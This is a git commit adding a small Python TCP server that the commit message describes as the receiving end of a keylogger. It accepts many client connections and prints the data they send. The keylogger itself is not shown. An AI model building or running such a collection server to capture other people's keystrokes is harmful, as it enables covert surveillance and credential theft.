3a1278dced120d462e8ef8b2ef493c68070614b8
ch16btech11002@iith.ac.in <aayushku01@gmail.com>
2018-05-22 14:54:07 +0530

    TCP socket server for Keylogger

---
+++ server.py
@@ -0,0 +1,41 @@
+import socket
+from  _thread import *
+
+host = ''
+port = 55555
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+try:
+	s.bind((host,port))
+except socket.error as e:
+	print(str(e))
+
+s.listen(5)
+
+print('Waiting...')
+
+def threaded_client(conn):
+	global a
+	while True:
+		data = conn.recv(2048)
+		if not data:
+			break
+		print("Received from ("+ conn.getpeername()[0] + ":"+ str(conn.getpeername()[1])+") ->" + data.decode('utf-8'))
+		if (data.decode('utf-8') == "Connection Closed"):
+			a.remove(conn.getpeername())
+		#conn.send(str.encode('>'))
+		#conn.sendall(str.encode(reply))
+	conn.close()
+
+a = []
+
+while True:
+
+	conn, addr = s.accept()
+	a.append(addr)
+	print('connected to: '+addr[0]+':'+str(addr[1]))
+	start_new_thread(threaded_client,(conn,))
+	print(a)
+s.shutdown()
+s.close()
